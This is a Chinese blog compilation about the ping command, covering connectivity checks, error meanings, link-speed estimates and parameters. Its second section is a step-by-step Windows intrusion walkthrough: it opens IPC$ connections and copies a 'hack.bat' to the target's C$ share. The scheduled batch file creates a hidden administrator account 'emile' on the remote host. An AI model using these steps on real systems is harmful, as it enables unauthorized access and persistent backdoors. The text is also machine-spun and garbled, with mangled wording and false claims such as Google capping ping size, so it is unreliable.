---



title: "Ping检查连通性有五个步骤：使用Ping/远程IP地址"
description: "Ping检查连通性有五个步骤：使用Ping/远程IP地址"
keywords: "Ping检查连通性有五个步骤：使用Ping/远程IP地址"
date: "2023-06-18T16:22:52+08:00"
defaultContentLanguage: "zh"
author: "Linux"
twitterSite: ""
thumbnail: "https://www.linuxcool.com/wp-content/uploads/2023/04/1682799035694_1.jpg"
categories:
  - Linux
type: article
githubURL: "https://www.github.com/"
ShowToc: true
TocOpen: true



---

第一篇：ping命令检查网路步骤

使用Ping检测连通性有五个步骤：

1.使用ipconfig/all观察本地网路设置是否正确；

2.Ping127.0.0.1，127.0.0.1回送地址Ping回送地址是为了检测本地的TCP/IP合同有没有设置好；3.Ping本机IP地址，这样是为了检测本机的IP地址是否设置有误；

(4.Ping本网网段或本网IP地址，这样的是为了检测硬件设备是否有问题，也可以检测本机与本地网路联接是否正常；（在非局域网中这一步骤可以忽视) 

5.Ping远程IP地址，这主要是检测本网或本机与外部的联接是否正常。

在检测网路连通的过程中可能出现一些错误，这种错误总的来说分为两种最常见:1.RequestTimedOut“requesttimeout”这提示不仅对方可能装有防火墙或已死机以外，还有就是本机的IP不正确和网段设置错误。①、IP不正确：IP不正确主要是IP地址设置错误或IP地址冲突，这可以借助ipconfig/all这命令来检测。在WIN2000下IP冲突的情况极少发生，由于系统会手动检查在网路中是否有相同的IP地址并提醒你是否设置正确。在NT中不但会出现“requesttimeout”这提示并且会出现“Hardwareerror”这提示信息比较特殊不要给它的提示所蒙蔽。

②、网关设置错误：这个错误可能会在第四个步骤出现。网段设置错误主要是网段地址设置不正确或网段没有帮你转发数据，还有就是可能远程网段失效。这儿主要是在你Ping外部网路地址时出错。错误表现为难以Ping外部主机返回信息“Requesttimeout”。

2.DestinationHostUnreachable当你在开始PING网路计算机时假如网路设备出错它返回信息会提示“destinationhostunreachable”。假如局域网中使用DHCP分配IP时，而恰巧DHCP失效，这时使用PING命令还会形成此错误。由于在DHCP失效时顾客机未能分配到IP系统只有自设IP，它常常会设为不同子网的IP。所以会出现“DestinationHostUnreachable”。另外子网网段设置错误也会出现这错误。

还有一个比较特殊就是路由返回错误信息，它通常还会在“DestinationHostUnreachable”前加上IP地址说明那个路由不能抵达目标主机。这说明你的机器与外部网路联接没有问题，但与某台主机联接存在问题。

(举个反例吧。我管理的网路有19台机，由一台100M网桥联接服务器，使用DHCP动态分配IP地址。有一次有位朋友匆匆地告诉我“我的OUTLOOK打不开了”，我到他机器检测，首先我检测了本地网路设置，我用ipconfig/all看IP分配情况一切正常。接着我就开始PING网路中的其中一台机器，第一次PING结果很正常，但OUTLOOK还是未能使用其它网路软件和Copy网路文件都可以使用但网路速率很慢，第二次PING我用了一个参数-t（-t可以不中断地PING对方，当时我想PING一次可能发觉不了问题) 发觉有time=30ms和requesttimeout，从服务器PING这台机就更有趣，requesttimeout比正常数据还多，在局域中居然有time=30ms和requesttimeout太不正常了。开始我觉得是网卡的问题但换网卡后故障仍然，重做网线还是不能解决问题红旗linux操作系统，这故障真有趣！最后我没办法了把它插在网桥端口上的另一端的网线换到另一个端口，哈！故障解决了。原先是网桥端口坏了。

怎样用Ping命令来判定一条链路的速率？

Ping这个命令不仅可以检测网路的连通和检查故障以外，还有一个比较有趣的用途，那就是可以借助它的一些返回数据，来计算你跟某台主机之间的速率是多少字节每秒我们先来瞧瞧它有这些返回数据。

(Pinging202.105.136.105with32bytesofdata:Replyfrom202.105.136.105:bytes=32time=590msTTL=114Replyfrom202.105.136.105:bytes=32time=590msTTL=114Replyfrom202.105.136.105:bytes=32time=590msTTL=114Replyfrom202.105.136.105:bytes=32time=601msTTL=114Pingstatisticsfor202.105.136.105:Packets:Sent=4,Received=4,Lost=0(0%loss),Approximateroundtriptimesinmilli-seconds:Minimum=590ms,Maximum=601ms,Average=593ms在事例中“bytes=32”表示ICMP报文中有32个字节的测试数据（这是计算速率的关键数据) ，“time=590ms”是往返时间。

如何计算链路的速率呢？举个反例吧。我们把A和B之间设置为PPP链路。

(从前面的PING事例可以注意到，默认情况下发送的ICMP报文有32个字节。不仅这32个字节外再加上20个字节的IP首部和8个字节的ICMP首部，整个IP数据报文的总宽度就是60个字节（由于IP和ICMP是Ping命令的主要使用合同，所以整个数据报文要加上它们) 。另外在使用Ping命令时还使用了另一个合同进行传输，那就是PPP合同（点对点合同），所以在数据的开始和结尾再加上8个字节。在传输过程中，因为每位字节富含8bit数据、1bit起始位和1bit结束位，因而传输速度是每位字节2.98ms。由此我们可以恐怕须要405ms。即68*2.98*2（乘2是由于我们还要估算它的往返时间）。我们来测试一下33600b/s的链路：

Pinging202.105.36.125with32bytesofdata:Replyfrom202.105.36.125:bytes=32time=415msTTL=114Replyfrom202.105.36.125:bytes=32time=415msTTL=114Replyfrom202.105.36.125:bytes=32time=415msTTL=114Replyfrom202.105.36.125:bytes=32time=421msTTL=114Pingstatisticsfor202.105.36.125:Packets:Sent=4,Received=4,Lost=0(0%loss),Approximateroundtriptimesinmilli-seconds:Minimum=415ms,Maximum=421ms,Average=417ms看是不是差不多啊。^_^

(这儿你们可能要注意到，这计算值跟实际值是有偏差的，为何呢？由于我们如今计算的是一个理论值，还有一些东西我们没有考虑。诸如在网路中的其它干扰，这种干扰主要来之别的计算机。由于在你测试时不可能全部计算机停止使用网路给你做测试，这是不实际的。另外就是传输设备，由于有个别设备如MODEM它在传输时会把数据压缩后再发送，这大大降低了传输时间。这种东西形成的偏差我们是不能避开的，但其数值大概在5%以内我们都可以接受（借助MODEM传输例外) ，并且可以降低偏差的形成。例如把MODEM的压缩功能关掉和在网路没有这么忙碌时进行测试。有时侯偏差是无须去除的。由于我们须要这种偏差跟所求得的理论值进行比较剖析 **ping命令参数**，进而找出网路的缺陷而进行优化。这时测试网路的所有数据包括偏差就会成为我们优化的根据。

还要注意，这些算法在局域网并不适用，由于在局域网中速率十分的快几乎多于1ms，而Ping的最小时间帧率是1ms，所以根本难以用Ping命令来测量速率。假如想测试速率那就要用专门仪器来测量。总的来说，Ping命令是一个在故障检测方面很有用并且很便利的工具，你不应当忽略它的存在。

第二篇：入侵ping命令

netview*.*.*.*查看指定IP主机上的共享

nbtstat-A*.*.*.*得到远程主机的NetBIOS用户名列表

copyserver1.exe*.*.*.*Admin$system32正式当前目录下的Server1.exe复制到对方Admin$共享的System32目录内

构建IPC$联接

事例：netuse192.168.1.60ipc$“”/user:”administrator“查看账号—netuser构建账号—netusernamepasswd/add删掉账号—netusernamepasswd/del断掉联接：

键入“netuse*/del”命令断掉所有的IPC$联接。键入“netuse目标IPIPC$/del”可以删掉指定目标IP的IPC$联接。

实例：构建侧门账号，步骤如下：(1)编撰BAT文件：

打开记事本，输入“netuseremile123456/add”和“netlocalgroupadministratorsemile/add”，之后把文件另存为“hack.bat”,保存在cmd当前默认目录下。(2)与目标主机构建IPC$联接，以192.168.1.60为例：

打开cmd窗口，分别执行命令：

netuse192.168.1.60ipc$”“/user:”administrator“netusez:192.168.1.60C$(3)拷贝bat文件到目标主机：

在cmd窗口输入copyhack.bat192.168.1.60C$，把文件拷贝到目标位置；也可以打开映射驱动器用图形界面直接进行拷贝操作。(4)通过计划任务使远程主机执行hack.bat文件：

首先键入“nettimeIP”查看远程主机的系统时间，再键入“atIPTIMECOMMAND”命令在远程主机上构建计划任务。

参数说明：IP—目标主机IP；TIME—设定计划任务执行的时间；COMMAND—计划任务要执行的命令，这么处为C:hack.bat。

计划任务添加完毕后，使用命令“netuse*/del”断开IPC$联接。(5)验证账号是否成功构建：

等待一段时间，当恐怕远程主机早已执行hack.bat文件后，通过用新账号构建IPC$联接来验证是否成功构建“emile”帐号，联接成功则说明账号成功构建。

3)获取目标主机上的用户信息：USERINFO.exe和X-Scan是常用的两款获取用户信息的工具。

a.USERINFO是借助IPC$漏洞来查看目标主机用户信息的工具，通过USERINFO来查看目标主机用户信息的时侯，并不须要事先构建IPC$空联接。命令：USERINFOIPUSER拿来查看目标IP上USER用户信息，之后按照反馈的结果进行具体剖析。

b.X-Scan扫描器也是借助目标主机存在的IPC$空联接漏洞，获取用户信息，用法略

netuser查看用户列表

netuser用户名密码/add添加用户netuser用户名密码修改用户密码

netlocalgroupadministrators用户名/add添加用户到管理组netuser用户名/delete删掉用户netuser用户名/delete删掉用户netuser用户名查看用户的基本情况netuser用户名/active:no禁用该用户netuser用户名/active:yes启用该用户

netshare查看计算机IPC$共享资源netshare共享名查看该共享的情况

netshare共享名=路径设置共享。诸如netsharec$=c:netshare共享名/delete删掉IPC$共享

netuse查看IPC$联接情况

netuseipipc$”密码“/user:”用户名”ipc$联接

nettimeip查看远程计算机上的时间

copy路径:文件名ip共享名复制文件到早已ipc$联接的计算机上

netviewip查看计算机上的共享资源

ftp服务器地址步入FTP服务器

at查看自己计算机上的计划作业

atip查看远程计算机上的计划作业

atip时间命令(注意加c盘)在远程计算机上加一个作业atip计划作业ID/delete删掉远程计算机上的一个计划作业atipall/delete删掉远程计算机上的全部计划作业

第三篇：ping命令快速搞定网路问题

![带参数 -a 的ping命令_ping命令参数_ping命令参数详解](https://www.linuxcool.com/wp-content/uploads/2023/04/1682799035694_1.jpg)

ping命令快速搞定网路问题

笔记本不能上网或则忽然不能上网了如何办？请专业人员来修理还是自己瞎急一通呢，下边给你们介绍怎么确切地判定笔记本不能上网问题出在那里？

又怎样能快捷地解决这故障？下文提供下小方法，这是本人多年工作经验，希望对你们有所帮助！

笔记本不能上网简单以下几个诱因：系统的IP设置、网卡、MODEM和线路故障。排除硬件及线路的故障问题，我们可以借助Ping命令来快速检查网路状况。

1.首先，我们点击系统中开始里的运行，在运行栏中输入cmd命令，操作系统中的DOS窗口都会弹出，在这儿我们可以直观和便捷地输入各类DOS命令。

笔记本右侧-开始-运行-输入CMD确定

2.接着，我们可以在DOS里输入Ping127.0.0.1，该地址是本地循环地址，如发觉本地址未能Ping通，就表明本地机TCP/IP合同不能正常工作,这么请重装TCP/IP合同。键入指令判定TCP/IP合同是否正常。

3.假如里面的操作成功，可Ping通的话，我们接出来可以输入IPConfig来查看本地的IP地址，之后Ping该IP也就是自己的IP，通则表明网卡或MODEM工作正常，不通则是网路适配器出现故障。

键入指令判定网卡或MODEM工作情况

ping自己的IP有反还值说明网卡和MODEM正常

4.之后Ping默认网段的IP，ping默认网段之前要先检测路由器设置上面是不是容许ping网段，检测防火墙设置容许ping出、ping入吗？检测完这种我们开始ping默认网段，不通则此段线路有问题，这么检测网线和路由器是否工作正常。

ping默认网段来判定本机到路由之间是否正常。

5.最后，检查一个带DNS服务的网路，简单的说就是ping一个网站，例如Ping，正常情况下会出现退还值，这表明本机的DNS设置正确并且DNS服务器工作正常，那就是我说我们的机器可以联接广域网了。

ping检查Internet网。

当以上五个步骤执行完毕后，我们就可轻易判定出究竟是某个环节出现了故障问题，该重新设置的设置，该换硬件的换硬件。

第四篇：Ping命令总结

ping127.0.0.1

通：操作系统TCP/IP功能完好

(不通：重新给系统安装TCP/IP（类UnixOS不会出现这些状况) ping本地ip

使用DHCP时，先使用ipconfig查看，若有ip，则正常，且说明局域网化学链路正常。此时ping这个ip，通则说明网卡工作正常。

(不通：重新安装网卡驱动ping局域网其他机器（多ping几台机器) 

通：局域网TCP/IP工作正常

不通：检测线路

检测Hub，Switcher

看对方机器是否将ICMP回应关闭ping网段

(通：到网段是OK的，假如不能上网，那就是网段的问题（例如网段将此机器屏蔽，网段到Internet的链接有问题) 

不通：按4检测

(（此时，就可以上网了，QQ哪些的就可以用了，由于这些东西通常直接用ip) 5pingDNS

通：全部OK

不通：换一个DNS

(本地DNS未设置（DHCP：没有进行DNS透传，自动设定吧) 

第五篇：Ping命令的常用参数选项

pingIPCt

连续对IP地址执行Ping命令，直至被用户以Ctrl+C中断。

pingIP-l3000

指定Ping命令中的数据宽度为3000字节，而不是缺省的32字节。

pingIPCn执行特定次数的Ping命令。

ping命令的完整格式如下：

ping[-t][-a][-ncount][-llength][-f][-ittl][-vtos][-rcount][-scount][-j-Hostlist]|[-kHost-list][-wtimeout]destination-list

从这个命令式中可以看出它的复杂程度，ping命令本身前面都是它的执行参数 **ping命令参数**，现对其参数作一下详尽讲解吧！

-t——有这个参数时，当你ping一个主机时系统就不停的运行ping这个命令linux是什么，直至你按下Control-C。

-a——解析主机的NETBIOS主机名，假如你想晓得你所ping的要机计算机名则要加上这个参数了，通常是在运用ping命令后的第一行就显示下来。

-ncount——定义拿来测试所发出的测试包的个数，缺省值为4。通过这个命令可以自己定义发送的个数，对评判网路速率很有帮助，例如我想测试发送20个数据包的返回的平均时间为多少，最快时间为多少，最慢时间为多少就可以通过执行带有这个参数的命令得知。

-llength——定义所发送缓冲区的数据包的大小，在默认的情况下windows的ping发送的数据包大小为32byt，也可以自己定义，但有一个限制，就是最大只能发送65500byt，超过这个数时，对方就很有可能因接收的数据包太大而关机，所以谷歌公司为了解决这一安全漏洞于是限制了ping的数据包大小。

-f——在数据包中发送“不要分段”标志，通常你所发送的数据包就会通过路由分段再发送给对方，加上此参数之后路由就不会再分段处理。

-ittl——指定TTL值在对方的系统里逗留的时间，此参数同样是帮助你检测网路运转情况的。

-vtos——将“服务类型”字段设置为“tos”指定的值。

-rcount——在“记录路由”字段中记录传出和返回数据包的路由。通常情况下你发送的数据包是通过一个个路由才抵达对方的，但究竟是经过了什么路由呢？通过此参数就可以设定你想侦测经过的路由的个数，不过限制在了9个，也就是说你只能跟踪到9个路由。

-scount——指定“count”指定的跃点数的时间戳，此参数和-r差不多，只是这个参数不记录数据包返回所经过的路由，最多也只记录4个。

-jhost-list——利用“computer-list”指定的计算机列表路由数据包。连续计算机可以被中间网段分隔IP容许的最大数目为9。

-khost-list——利用“computer-list”指定的计算机列表路由数据包。连续计算机不能被中间网段分隔IP容许的最大数目为9。

-wtimeout——指定超时间隔，单位为微秒。

destination-list——是指要测试的主机名或IP地址